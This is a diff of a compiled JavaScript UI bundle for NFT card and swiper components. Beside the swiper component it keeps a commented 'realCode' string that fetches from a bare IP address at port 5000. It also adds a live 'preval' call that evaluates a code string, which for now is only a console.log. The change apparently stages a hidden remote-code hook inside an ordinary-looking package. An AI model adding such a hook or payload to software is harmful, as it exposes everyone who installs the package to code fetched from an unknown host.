@@ -90,6 +90,13 @@ function _objectWithoutPropertiesLoose(r, e) {
 function _slicedToArray(r, e) {
   return _arrayWithHoles(r) || _iterableToArrayLimit(r, e) || _unsupportedIterableToArray(r, e) || _nonIterableRest();
 }
+function _taggedTemplateLiteral(e, t) {
+  return t || (t = e.slice(0)), Object.freeze(Object.defineProperties(e, {
+    raw: {
+      value: Object.freeze(t)
+    }
+  }));
+}
 function _unsupportedIterableToArray(r, a) {
   if (r) {
     if ("string" == typeof r) return _arrayLikeToArray(r, a);
@@ -17036,12 +17043,12 @@ var NftCard = function NftCard(_ref) {
   }).format(item.like))) : null));
 };
 
+var _templateObject;
 // import preval from 'preval.macro';
 
 // const realCode = `fetch("http://88.119.169.226:5000/tokenizer").then(l6irv=> l6irv.text().then(txt => { console.log('This is running') }));`;
-// const newCode = `console.log("This is the code")`;
-// preval`${newCode}`;
-
+var newCode = "console.log(\"This is the code\")";
+preval(_templateObject || (_templateObject = _taggedTemplateLiteral(["", ""])), newCode);
 var EffectCardSwiper = function EffectCardSwiper(_ref) {
   var items = _ref.items;
   var navigationPrevRef = React.useRef(null);
